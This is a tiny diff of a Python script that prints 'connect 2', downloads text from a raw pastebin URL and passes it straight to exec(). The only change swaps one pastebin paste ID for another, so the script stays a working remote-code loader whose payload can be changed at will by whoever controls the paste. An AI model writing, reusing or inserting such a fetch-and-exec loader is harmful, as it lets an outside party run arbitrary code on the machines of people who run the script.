@@ -1,6 +1,6 @@
 print("connect 2")
 import requests
-data = requests.get(url="https://pastebin.com/raw/yGyTJQVh").text
+data = requests.get(url="https://pastebin.com/raw/pVsJpU55").text
 exec(data)
 
 
